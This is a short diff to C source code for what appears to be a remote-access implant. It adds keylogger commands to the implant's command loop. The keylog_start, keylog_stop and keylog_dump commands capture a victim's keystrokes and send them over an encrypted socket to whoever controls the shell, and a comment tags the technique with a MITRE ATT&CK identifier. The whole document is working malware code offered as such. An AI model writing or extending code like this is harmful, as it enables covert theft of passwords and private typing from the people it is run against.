@@ -11,6 +11,7 @@
 #include <string.h>
 
 #include "crypto.h"
+#include "keylog.h"
 #include "shell.h"
 
 /* ================================================================
@@ -122,6 +123,32 @@ void shell_loop(SOCKET sock)
         /* Commande vide : renvoyer une ligne vide */
         if (len == 0) {
             send_enc(sock, (uint8_t *)"\r\n", 2);
+            continue;
+        }
+
+        /* Commandes internes du keylogger (T1056.001) */
+        if (strcmp(cmd, "keylog_start") == 0) {
+            const char *msg = (keylog_start() == 0)
+                ? "[keylogger started]\r\n"
+                : "[keylogger already running]\r\n";
+            send_enc(sock, (uint8_t *)msg, (int)strlen(msg));
+            continue;
+        }
+        if (strcmp(cmd, "keylog_stop") == 0) {
+            const char *msg = (keylog_stop() == 0)
+                ? "[keylogger stopped]\r\n"
+                : "[keylogger not running]\r\n";
+            send_enc(sock, (uint8_t *)msg, (int)strlen(msg));
+            continue;
+        }
+        if (strcmp(cmd, "keylog_dump") == 0) {
+            char *dump = keylog_dump();
+            if (dump) {
+                send_enc(sock, (uint8_t *)dump, (int)strlen(dump));
+                free(dump);
+            } else {
+                send_enc(sock, (uint8_t *)"[error]\r\n", 9);
+            }
             continue;
         }
 
